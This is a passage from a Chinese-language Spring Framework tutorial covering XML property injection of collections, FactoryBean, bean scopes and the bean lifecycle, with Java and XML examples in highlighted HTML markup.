punctuation">"</span>安保部门<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>（2）第二种写法(需声明对象<strong>department</strong>的get方法)</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--级联赋值--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>employee<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.bean.Employee<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--普通属性--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Micah<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>男<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token comment" spellcheck="true">&lt;!--级联赋值--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>department<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>department<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>department.dname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>技术部<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>department<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.bean.Department<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>财务部<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h4 id="7、注入集合属性"><a href="#7、注入集合属性" class="headerlink" title="7、注入集合属性"></a>7、注入集合属性</h4><p>1、注入数组类型属性</p><p> 2、注入 List 集合类型属性 </p><p>3、注入 Map 集合类型属性 </p><p>（1）创建类，定义数组、 list、 map、 set 类型属性，生成对应 set 方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Stu</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//1 数组类型属性</span>    <span class="token keyword">private</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> courses<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//2 list 集合类型属性</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> list<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//3 map 集合类型属性</span>    <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">></span> maps<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//4 set 集合类型属性</span>    <span class="token keyword">private</span> Set<span class="token operator">&lt;</span>String<span class="token operator">></span> sets<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSets</span><span class="token punctuation">(</span>Set<span class="token operator">&lt;</span>String<span class="token operator">></span> sets<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sets <span class="token operator">=</span> sets<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCourses</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> courses<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>courses <span class="token operator">=</span> courses<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setList</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>list <span class="token operator">=</span> list<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMaps</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> maps<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>maps <span class="token operator">=</span> maps<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--1 集合类型属性注入--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stu<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.collectiontype.Stu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--数组类型属性注入--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>courses<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>java 课程<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>数据库课程<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--list 类型属性注入--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>张三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>小三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--map 类型属性注入--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>maps<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>JAVA<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entry</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--set 类型属性注入--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sets<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>set</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>MySQL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>Redis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>set</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>​    4、在集合里面设置对象类型值</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--创建多个 course 对象--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>course1<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.collectiontype.Course<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Spring5 框架<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>course2<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.collectiontype.Course<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MyBatis 框架<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--注入 list 集合类型，值是对象--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>courseList<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ref</span> <span class="token attr-name">bean</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>course1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ref</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ref</span> <span class="token attr-name">bean</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>course2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ref</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span></code></pre><p>​    5、把集合注入部分提取出来</p><p>​        1、在 spring配置文件中引入名称空间 util</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>util</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/util<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                          http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>​    2、使用 util标签完成 list集合注入提取</p><pre class=" language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!--1、提取list集合类型属性的注入--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">util:</span>list</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>booklist<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>Spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>Java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>JVM Machine<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">util:</span>list</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--2、提取list集合类型属性的注入使用    scope:(1)"prototype"多实例        （2）"singleton"单实例    --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>book<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.collection.Book<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prototype<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>booklist<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><h3 id="三、FactoryBean"><a href="#三、FactoryBean" class="headerlink" title="三、FactoryBean"></a>三、FactoryBean</h3><h4 id="1、Spring-有两种类型-bean，一种普通-bean，另外一种工厂-bean（FactoryBean）"><a href="#1、Spring-有两种类型-bean，一种普通-bean，另外一种工厂-bean（FactoryBean）" class="headerlink" title="1、Spring 有两种类型 bean，一种普通 bean，另外一种工厂 bean（FactoryBean）"></a>1、Spring 有两种类型 bean，一种普通 bean，另外一种工厂 bean（FactoryBean）</h4><ul><li>普通 bean：在配置文件中定义 bean 类型就是返回类型</li><li>工厂 bean：在配置文件定义 bean 类型可以和返回类型不一样</li></ul><h4 id="2、-案例演示"><a href="#2、-案例演示" class="headerlink" title="2、 案例演示"></a>2、 案例演示</h4><ul><li>第一步 创建类，让这个类作为工厂 bean，实现接口 FactoryBean</li><li>第二步 实现接口里面的方法，在实现的方法中定义返回的 bean 类型</li><li>定义MyBean对象返回的实际是Course对象</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyBean</span> <span class="token keyword">implements</span> <span class="token class-name">FactoryBean</span><span class="token operator">&lt;</span>Course<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 定义返回bean     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Course <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Course course <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Course</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        course<span class="token punctuation">.</span><span class="token function">setcName</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> course<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">getObjectType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml">&lt;bean id="myBean" class="com.atguigu.spring5.factorybean.MyBean"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ApplicationContext context <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"bean3.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Course course <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"myBean"</span><span class="token punctuation">,</span> Course<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>course<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="四、Spring-Bean作用域"><a href="#四、Spring-Bean作用域" class="headerlink" title="四、Spring Bean作用域"></a>四、Spring Bean作用域</h3><h4 id="1、在-Spring-里面，你怎样定义类的作用域"><a href="#1、在-Spring-里面，你怎样定义类的作用域" class="headerlink" title="1、在 Spring 里面，你怎样定义类的作用域?"></a>1、在 Spring 里面，你怎样定义类的作用域?</h4><p>当定义一个 在Spring里，我们还能给这个bean声明一个作用域。它可以通过bean 定义中的scope属性来定义。如，当Spring要在需要的时候每次生产一个新的bean实例，bean的<strong>scope</strong>属性被指定为prototype。另一方面，一个bean每次使用的时候必须返回同一个实例，这个bean的scope 属性 必须设为 singleton。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ApplicationContext context <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"bean3.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//course1和course2的地址一样，默认为单例singleton</span>    Course course1 <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"myBean"</span><span class="token punctuation">,</span> Course<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Course course2 <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"myBean"</span><span class="token punctuation">,</span> Course<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>course<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="2、解释Spring支持的几种bean的作用域。"><a href="#2、解释Spring支持的几种bean的作用域。" class="headerlink" title="2、解释Spring支持的几种bean的作用域。"></a>2、解释Spring支持的几种bean的作用域。</h4><p><strong>Spring框架支持以下五种bean的作用域</strong>：</p><p>​    <strong>singleton</strong> : bean在每个Spring ioc 容器中只有一个实例，在加载spring配置的时候创建单实例对象。<br>​    <strong>prototype</strong>：一个bean的定义可以有多个实例。不是在加载spring配置的时候创建对象，而是在调用getBean方法的时候创建多实例对象。<br>​    <strong>request</strong>：将单个bean定义的范围限定为单个HTTP请求的生命周期； 也就是说，每个HTTP请求都有一个自己的bean实例，它是在单个bean定义的后面创建的。 仅在基于Web的Spring ApplicationContext上下文中有效。<br>​    <strong>session</strong>：将单个bean定义的作用域限定为HTTP会话的生命周期。 仅在web的Spring     ApplicationContext上下文中有效。<br>​    <strong>application</strong>:将单个bean定义的作用域限定为ServletContext的生命周期。 仅在基于web的Spring ApplicationContext上下文中有效。<br>​    <strong>websocket</strong>:将单个bean定义的作用域限定为WebSocket的生命周期。 仅在基于web的Spring ApplicationContext上下文中有效。</p><h4 id="3、-Spring框架中的单例bean是线程安全的吗"><a href="#3、-Spring框架中的单例bean是线程安全的吗" class="headerlink" title="3、 Spring框架中的单例bean是线程安全的吗?"></a>3、 Spring框架中的单例bean是线程安全的吗?</h4><p>不，Spring框架中的单例bean不是线程安全的。</p><h3 id="五、Spring-Bean生命周期"><a href="#五、Spring-Bean生命周期" class="headerlink" title="五、Spring Bean生命周期"></a>五、Spring Bean生命周期</h3><h4 id="1、Spring框架中bean的生命周期。"><a href="#1、Spring框架中bean的生命周期。" class="headerlink" title="1、Spring框架中bean的生命周期。"></a>1、Spring框架中bean的生命周期。</h4><ol><li><p>Spring容器 从XML 文件中读取bean的定义，并实例化bean。</p></li><li><p>Spring根据bean的定义填充所有的属性。</p></li><li><p>如果bean实现了BeanNameAware 接口，Spring 传递bean 的ID 到 setBeanName方法。</p></li><li><p>如果Bean实现了 BeanFactoryAware 接口， Spring传递beanfactory 给setBeanFactory方法。</p></li><li><p>如果有任何与bean相关联的BeanPostProcessors，Spring会在postProcesserBeforeInitialization()方法内调用它们。</p></li><li><p>如果bean实现IntializingBean了，调用它的afterPropertySet方法，如果bean声明了初始化方法，调</p><p>用此初始化方法。如果有BeanPostProcessors 和bean关联，这些bean的postProcessAfterInitialization()方法将被调用。</p></li><li><p>如果bean实现了 DisposableBean，它将调用destroy()方法。</p></li></ol><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//无bean 的后置处理器， bean 生命周期有五步</span>（<span class="token number">1</span>）通过构造器创建 bean 实例（无参数构造）（<span class="token number">2</span>）为 bean 的属性设置值和对其他 bean 引用（调用 set 方法）（<span class="token number">3</span>）调用 bean 的初始化的方法（需要进行配置初始化的方法）（<span class="token number">4</span>） bean 可以使用了（对象获取到了）（<span class="token number">5</span>）当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法）<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Orders</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//无参数构造</span>    <span class="token keyword">public</span> <span class="token function">Orders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一步 执行无参数构造创建 bean 实例"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> String oname<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOname</span><span class="token punctuation">(</span>String oname<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>oname <span class="token operator">=</span> oname<span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二步 调用 set 方法设置属性值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//创建执行的初始化的方法</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第三步 执行初始化的方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//创建执行的销毁的方法</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroyMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第五步 执行销毁的方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testBean3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// ApplicationContext 